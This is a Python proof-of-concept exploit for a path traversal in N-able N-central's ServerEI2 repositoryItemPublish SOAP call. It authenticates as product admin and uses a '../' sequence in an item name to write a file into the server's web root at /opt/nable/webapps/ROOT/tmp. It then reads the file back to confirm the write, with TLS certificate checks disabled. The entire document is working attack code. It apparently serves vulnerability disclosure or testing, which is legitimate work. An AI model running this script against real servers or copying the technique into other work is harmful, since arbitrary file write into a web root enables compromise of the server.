#!/usr/bin/env python3
import argparse
import base64
import getpass
import html
import os
import uuid

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central ServerEI2 repositoryItemPublish traversal")
    p.add_argument("--ui", default="https://192.168.1.14:8443")
    p.add_argument("--soap", default="https://192.168.1.14")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    item_uuid = "{" + str(uuid.uuid4()) + "}"
    stem = "policy_" + uuid.uuid4().hex[:10]
    name = "../../../../../opt/nable/webapps/ROOT/tmp/" + stem
    policy = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<Policy ID="{item_uuid}" Name="Policy" Description="" RemoteCategory="0" '
        'NableVer="2026.4.0.31" ExecutionType="AutomationPolicy"/>'
    )
    soap = f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body>
<repositoryItemPublish xmlns="http://ei2.nobj.nable.com/">
<username>{html.escape(a.username)}</username>
<password>{base64.b64encode(password.encode()).decode()}</password><customerId>1</customerId>
<repositoryItem><repositoryItemUUID>{item_uuid}</repositoryItemUUID><name>{name}</name>
<description></description><policyFile>{base64.b64encode(policy.encode()).decode()}</policyFile></repositoryItem>
<overwrite>false</overwrite></repositoryItemPublish></s:Body></s:Envelope>'''
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        a.soap.rstrip("/") + "/dms2/services2/ServerEI2",
        headers={"Content-Type": "application/soap+xml; charset=utf-8"},
        data=soap,
        verify=False,
        timeout=60,
    )
    written = requests.get(a.ui.rstrip("/") + "/tmp/" + stem + ".amp", verify=False, timeout=30)
    print(f"soap={response.status_code}")
    print(f"read={written.status_code}")
    print(f"bytes={len(written.content)}")


if __name__ == "__main__":
    main()
